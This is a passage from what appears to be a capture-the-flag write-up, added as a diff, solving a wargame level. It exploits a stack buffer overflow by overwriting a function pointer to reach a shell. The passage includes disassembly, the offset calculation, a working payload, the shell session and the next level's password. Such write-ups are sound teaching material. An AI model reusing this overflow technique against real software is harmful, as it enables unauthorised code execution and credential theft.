@@ -79,9 +79,67 @@ IFd92yzOnSMv9tkX
 
 ___
 
+This one was a stack vulnerability in it's purest form.
 
+```
+.text:08048510 call    _strlen
+.text:08048515 mov     [esp+8], eax                    ; size of argv[1]
+.text:08048519 mov     eax, [ebp+arg_4]
+.text:0804851C add     eax, 4
+.text:0804851F mov     eax, [eax]
+.text:08048521 mov     [esp+4], eax                    ; argv[1] adress
+.text:08048525 lea     eax, [ebp+dest]                 ; destination buffer
+.text:08048528 mov     [esp], eax
+.text:0804852B call    _memcpy                         ; theres no limitation of the input argument size
 
+```
+Obviously we can write an arbitrary amount of data into the input buffer.
+The stack layout:
 
+```
+.text:080484C8 var_5C          = dword ptr -5Ch
+.text:080484C8 dest            = byte ptr -58h
+.text:080484C8 var_C           = dword ptr -0Ch
+.text:080484C8 arg_0           = dword ptr  8
+.text:080484C8 arg_4           = dword ptr  0Ch
+```
+
+Var_C is later called, normally holding the adress to the function called bad.
+We want to overwrite it with the adress to the function called good :)
+
+```
+.text:0804856D mov     eax, [ebp+var_C]
+.text:08048570 call    eax
+```
+
+So how big is the offset?
+58h-0C=4C which is 76 byte.
+Lets verify it.
+
+```python
+>>> print "A"*76+"BBBB"
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+```
+
+![EAXOwned](/images/EAXLevel3.png)
+
+Awesome!
+
+Adress of good: 0x08048474
+
+So our exploit will be:
+
+```python
+print "A"*76+\x74\x84\x04\x08"
+
+```
+
+```
+level3@io:/levels$ ./level03 $(python -c "print \"A\"*76+\"\x74\x84\x04\x08\"")
+This is exciting we're going to 0x8048474 Win.
+sh-4.2$ cat /home/level4/.pass
+nSwmULj2LpDnRGU2
+```
 ##Level04
 
 ___
